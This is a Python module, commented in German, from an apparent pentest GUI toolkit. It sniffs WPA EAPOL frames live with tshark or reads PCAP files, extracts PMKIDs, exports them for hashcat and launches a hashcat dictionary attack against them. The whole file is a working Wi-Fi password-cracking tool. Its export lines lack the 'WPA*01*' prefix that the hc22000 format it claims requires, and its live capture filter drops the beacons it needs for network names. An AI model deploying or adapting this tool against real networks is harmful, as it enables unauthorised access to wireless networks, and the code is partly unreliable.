"""PMKID-Sniffer & -Extraktor – extrahiert PMKIDs aus PCAP oder per Live-Capture."""
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import re
import struct
import hashlib
import hmac
import os
from pathlib import Path
from modules.base import BaseModule
from utils.theme import DARK

# ─── PMKID-Extraktion ─────────────────────────────────────────────────────────

def _parse_eapol(data: bytes) -> bytes | None:
    """Gibt PMKID (16 Bytes) aus EAPOL-Key-Frame zurück oder None."""
    if len(data) < 99:
        return None
    # EAPOL: version(1) type(1) length(2) key-descriptor-type(1)
    # key-info(2) key-len(2) replay(8) nonce(32) IV(16) RSC(8) reserved(8) MIC(16) data-len(2) data
    if data[0] not in (1, 2, 3):   # EAPOL version
        return None
    if data[1] != 3:                # EAPOL type = Key
        return None
    key_info = struct.unpack(">H", data[5:7])[0]
    pairwise = (key_info >> 3) & 1
    install  = (key_info >> 6) & 1
    ack      = (key_info >> 7) & 1
    if not (pairwise and ack and not install):  # nur Msg 1
        return None
    data_len = struct.unpack(">H", data[97:99])[0]
    if data_len < 22 or len(data) < 99 + data_len:
        return None
    key_data = data[99:99 + data_len]
    # RSN PMKID suchen: tag=0x30 len tag=0x14 ...
    i = 0
    while i < len(key_data) - 2:
        tag = key_data[i]
        tlen = key_data[i + 1]
        if tag == 0x30 and tlen >= 20:
            body = key_data[i + 2:i + 2 + tlen]
            # PMKID-Count am Ende der RSN IE
            cnt_offset = 2 + 4 * ((body[0] if len(body) > 0 else 0))
            if len(body) > cnt_offset + 1:
                cnt = struct.unpack("<H", body[cnt_offset:cnt_offset + 2])[0]
                if cnt == 1 and len(body) >= cnt_offset + 18:
                    return body[cnt_offset + 2:cnt_offset + 18]
        i += 2 + tlen
    return None


def _extract_from_pcap(pcap_path: str, log_cb) -> list[dict]:
    """Liest PCAP und extrahiert alle PMKIDs."""
    try:
        from scapy.all import PcapReader, Dot11, EAPOL, Dot11Beacon
        import scapy.all as sc
    except ImportError:
        log_cb("[!] Scapy nicht installiert: pip install scapy")
        return []

    results = []
    seen    = set()
    ap_names: dict[str, str] = {}

    log_cb(f"[*] Lese PCAP: {pcap_path}")
    try:
        with PcapReader(pcap_path) as reader:
            for pkt in reader:
                # Beacon → ESSID sammeln
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[sc.Dot11].addr3
                    try:
                        essid = pkt[sc.Dot11Elt].info.decode(errors="replace")
                        ap_names[bssid.lower()] = essid
                    except Exception:
                        pass

                if not pkt.haslayer(EAPOL):
                    continue
                dot11 = pkt.getlayer(sc.Dot11) if pkt.haslayer(sc.Dot11) else None
                if not dot11:
                    continue
                ap_mac  = (dot11.addr3 or dot11.addr2 or "").lower()
                sta_mac = (dot11.addr1 or "").lower()

                eapol_bytes = bytes(pkt[EAPOL])
                pmkid = _parse_eapol(eapol_bytes)
                if pmkid:
                    key = pmkid.hex()
                    if key not in seen:
                        seen.add(key)
                        essid = ap_names.get(ap_mac, "")
                        results.append({
                            "pmkid":   key,
                            "ap_mac":  ap_mac,
                            "sta_mac": sta_mac,
                            "essid":   essid,
                        })
                        log_cb(f"[+] PMKID gefunden: {key}  AP={ap_mac}  STA={sta_mac}"
                               + (f"  ESSID={essid}" if essid else ""))
    except Exception as e:
        log_cb(f"[!] Fehler beim Lesen: {e}")

    return results


def _to_hc22000(results: list[dict]) -> str:
    """Konvertiert PMKID-Liste ins hc22000-Format für hashcat."""
    lines = []
    for r in results:
        pmkid   = r["pmkid"]
        ap_mac  = r["ap_mac"].replace(":", "").replace("-", "")
        sta_mac = r["sta_mac"].replace(":", "").replace("-", "")
        essid   = r["essid"].encode().hex() if r["essid"] else ""
        # Format: PMKID*AP_MAC*STA_MAC*ESSID_HEX
        lines.append(f"{pmkid}*{ap_mac}*{sta_mac}*{essid}")
    return "\n".join(lines)


# ─── Live-Capture via tshark ──────────────────────────────────────────────────

def _start_live_capture(iface: str, outfile: str, log_cb) -> "subprocess.Popen":
    import subprocess
    cmd = [
        "tshark", "-i", iface,
        "-f", "wlan type mgt subtype beacon or (wlan type data and eapol)",
        "-w", outfile,
        "-F", "pcap",
    ]
    log_cb(f"[*] Starte Live-Capture: {' '.join(cmd)}")
    return subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True, bufsize=1)


# ─── Modul-UI ─────────────────────────────────────────────────────────────────

class PmkidModule(BaseModule):

    def _build(self):
        self._info_bar(self,
            "PMKID-Sniffer – Extrahiert PMKIDs aus PCAP-Dateien oder per Live-Capture für hashcat -m 22000.")

        paned = tk.PanedWindow(self, orient="horizontal",
                               bg=DARK["bg"], sashwidth=4)
        paned.pack(fill="both", expand=True, padx=4, pady=4)

        left  = tk.Frame(paned, bg=DARK["bg"]); paned.add(left,  minsize=300, width=340)
        right = tk.Frame(paned, bg=DARK["bg"]); paned.add(right, minsize=420)

        # ── PCAP-Extraktion ───────────────────────────────────────────────────
        fp = self._section(left, "PCAP → PMKID extrahieren")
        self._pcap_var = tk.StringVar()
        row1 = tk.Frame(fp, bg=DARK["bg"]); row1.pack(fill="x", padx=10, pady=4)
        tk.Entry(row1, textvariable=self._pcap_var,
                 bg=DARK["entry"], fg=DARK["fg"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Segoe UI", 9)).pack(side="left", fill="x", expand=True, ipady=3)
        ttk.Button(row1, text="…",
                   command=self._browse_pcap).pack(side="left", padx=(4, 0))
        ttk.Button(fp, text="PMKIDs extrahieren",
                   style="Accent.TButton",
                   command=self._run_extract).pack(fill="x", padx=10, pady=(0, 6))

        # ── Live-Capture ──────────────────────────────────────────────────────
        fl = self._section(left, "Live-Capture (benötigt tshark + Monitor-Mode)")
        self._iface_var = tk.StringVar(value="WiFi")
        irow = tk.Frame(fl, bg=DARK["bg"]); irow.pack(fill="x", padx=10, pady=4)
        tk.Label(irow, text="Interface:", bg=DARK["bg"], fg=DARK["fg"],
                 font=("Segoe UI", 8), width=10, anchor="w").pack(side="left")
        tk.Entry(irow, textvariable=self._iface_var,
                 bg=DARK["entry"], fg=DARK["accent"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Consolas", 9)).pack(side="left", fill="x", expand=True, ipady=2)

        btn_row = tk.Frame(fl, bg=DARK["bg"]); btn_row.pack(fill="x", padx=10, pady=4)
        self._live_btn = ttk.Button(btn_row, text="Capture starten",
                                    style="Accent.TButton",
                                    command=self._start_live)
        self._live_btn.pack(side="left", fill="x", expand=True)
        self._stop_live_btn = ttk.Button(btn_row, text="Stoppen",
                                         style="Danger.TButton",
                                         command=self._stop_live,
                                         state="disabled")
        self._stop_live_btn.pack(side="left", fill="x", expand=True, padx=(4, 0))

        self._tooltip(self._live_btn,
            "Startet tshark im Monitor-Mode um EAPOL-Frames live zu sniffern.\n"
            "Adapter muss Monitor-Mode unterstützen (Alfa AWUS036ACH etc.).")

        tk.Label(fl, text="Hinweis: Monitor-Mode auf Windows erfordert\n"
                           "kompatiblen WLAN-Adapter (z.B. Alfa AWUS036).",
                 bg=DARK["bg"], fg=DARK["border"],
                 font=("Segoe UI", 7, "italic"), justify="left").pack(
            anchor="w", padx=10, pady=(0, 6))

        # ── Export ────────────────────────────────────────────────────────────
        fe = self._section(left, "Export")
        self._out_var = tk.StringVar(
            value=str(Path(self.cfg.get("workspace", str(Path.home() / "pentest")))
                      / "pmkid.hc22000"))
        erow = tk.Frame(fe, bg=DARK["bg"]); erow.pack(fill="x", padx=10, pady=4)
        tk.Entry(erow, textvariable=self._out_var,
                 bg=DARK["entry"], fg=DARK["fg"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Segoe UI", 8)).pack(side="left", fill="x", expand=True, ipady=2)
        ttk.Button(erow, text="…",
                   command=lambda: self._browse_save(self._out_var)).pack(
            side="left", padx=(4, 0))
        ttk.Button(fe, text="Als .hc22000 speichern",
                   command=self._export_hc22000).pack(fill="x", padx=10, pady=(0, 6))
        ttk.Button(fe, text="In Hashcat öffnen",
                   command=self._send_to_hashcat).pack(fill="x", padx=10, pady=(0, 6))

        # ── Rechts: Ergebnis-Treeview + Log ──────────────────────────────────
        fres = self._section_expand(right, "Gefundene PMKIDs")
        fres.pack(fill="both", expand=True)
        cols = ("pmkid", "ap_mac", "sta_mac", "essid")
        self._tree = ttk.Treeview(fres, columns=cols, show="headings",
                                   selectmode="browse")
        for col, w, label in [
            ("pmkid",   200, "PMKID (16 Byte hex)"),
            ("ap_mac",  130, "AP MAC"),
            ("sta_mac", 130, "Client MAC"),
            ("essid",   160, "ESSID"),
        ]:
            self._tree.heading(col, text=label)
            self._tree.column(col, width=w, minwidth=60)
        self._tree.tag_configure("found", foreground=DARK["green"])
        tsb = ttk.Scrollbar(fres, command=self._tree.yview)
        self._tree.configure(yscrollcommand=tsb.set)
        tsb.pack(side="right", fill="y")
        self._tree.pack(fill="both", expand=True, padx=6, pady=4)

        self._count_var = tk.StringVar(value="")
        tk.Label(right, textvariable=self._count_var,
                 bg=DARK["bg"], fg=DARK["accent"],
                 font=("Segoe UI", 8)).pack(anchor="e", padx=10)

        self._log_out = self._log_widget(right, height=7)
        self._results: list[dict] = []
        self._live_proc = None

    # ── Helfer ────────────────────────────────────────────────────────────────

    def _browse_pcap(self):
        p = filedialog.askopenfilename(
            title="PCAP wählen",
            filetypes=[("PCAP", "*.pcap *.pcapng *.cap"), ("Alle", "*.*")])
        if p:
            self._pcap_var.set(p)

    def _browse_save(self, var: tk.StringVar):
        p = filedialog.asksaveasfilename(
            title="Ausgabedatei",
            defaultextension=".hc22000",
            filetypes=[("Hashcat 22000", "*.hc22000"), ("Alle", "*.*")])
        if p:
            var.set(p)

    def _log(self, text: str):
        self._log_out.configure(state="normal")
        import datetime
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self._log_out.insert("end", f"[{ts}] {text}\n")
        self._log_out.see("end")
        self._log_out.configure(state="disabled")
        if self._activity_cb:
            self._activity_cb(f"PMKID: {text}")

    def _add_result(self, r: dict):
        self._results.append(r)
        self._tree.insert("", "end",
                          values=(r["pmkid"], r["ap_mac"], r["sta_mac"], r["essid"]),
                          tags=("found",))
        self._count_var.set(f"{len(self._results)} PMKID(s) gefunden")

    # ── Aktionen ──────────────────────────────────────────────────────────────

    def _run_extract(self):
        pcap = self._pcap_var.get().strip()
        if not pcap or not os.path.exists(pcap):
            messagebox.showerror("Fehler", "Bitte eine gültige PCAP-Datei wählen.")
            return
        self._tree.delete(*self._tree.get_children())
        self._results.clear()
        self._count_var.set("")

        def worker():
            results = _extract_from_pcap(pcap, self._log)
            for r in results:
                self.after(0, self._add_result, r)
            self.after(0, lambda: self._log(
                f"Extraktion abgeschlossen. {len(results)} PMKID(s) gefunden."))

        threading.Thread(target=worker, daemon=True).start()

    def _start_live(self):
        tshark = self._tool_path("tshark")
        if not tshark:
            messagebox.showerror("Fehler", "tshark nicht gefunden.\n"
                                 "Wireshark installieren und Pfad in Einstellungen setzen.")
            return
        iface = self._iface_var.get().strip()
        if not iface:
            messagebox.showerror("Fehler", "Interface angeben."); return

        ws = self.cfg.get("workspace", str(Path.home() / "pentest"))
        os.makedirs(ws, exist_ok=True)
        import datetime
        outfile = str(Path(ws) / f"pmkid_live_{datetime.datetime.now():%Y%m%d_%H%M%S}.pcap")
        self._live_pcap = outfile

        self._tree.delete(*self._tree.get_children())
        self._results.clear()
        self._count_var.set("")

        cmd = [tshark, "-i", iface,
               "-f", "ether proto 0x888e",
               "-w", outfile, "-F", "pcap"]

        self._log(f"Live-Capture startet auf '{iface}' → {outfile}")
        self._live_btn.configure(state="disabled")
        self._stop_live_btn.configure(state="normal")

        self._run_tool(cmd, None, self._log_out,
                       on_done=self._on_live_done,
                       start_btn=self._live_btn,
                       stop_btn=self._stop_live_btn)

    def _stop_live(self):
        self._stop_tool()
        self._live_btn.configure(state="normal")
        self._stop_live_btn.configure(state="disabled")

    def _on_live_done(self, rc: int):
        self._live_btn.configure(state="normal")
        self._stop_live_btn.configure(state="disabled")
        pcap = getattr(self, "_live_pcap", "")
        if pcap and os.path.exists(pcap):
            self._log(f"Capture gestoppt. Extrahiere PMKIDs aus {pcap}...")
            self._pcap_var.set(pcap)
            self._run_extract()

    def _export_hc22000(self):
        if not self._results:
            messagebox.showinfo("Leer", "Keine PMKIDs vorhanden."); return
        out = self._out_var.get().strip()
        if not out:
            return
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        content = _to_hc22000(self._results)
        with open(out, "w", encoding="ascii") as f:
            f.write(content + "\n")
        self._log(f"Gespeichert: {out}  ({len(self._results)} Einträge)")
        messagebox.showinfo("Gespeichert", f"{len(self._results)} PMKID(s) → {out}")

    def _send_to_hashcat(self):
        if not self._results:
            messagebox.showinfo("Leer", "Keine PMKIDs vorhanden."); return
        out = self._out_var.get().strip()
        if not out:
            out = str(Path(self.cfg.get("workspace", str(Path.home() / "pentest")))
                      / "pmkid.hc22000")
            self._out_var.set(out)
        self._export_hc22000()
        hashcat = self._tool_path("hashcat")
        if not hashcat:
            messagebox.showwarning("Hashcat", "hashcat nicht gefunden.\n"
                                   "Pfad in den Einstellungen konfigurieren.")
            return
        # Standard-Befehl für PMKID: hashcat -m 22000
        import subprocess
        cmd = f'start cmd /k "{hashcat}" -m 22000 "{out}" -a 0 wordlist.txt'
        self._log(f"Öffne hashcat: {cmd}")
        subprocess.Popen(cmd, shell=True)
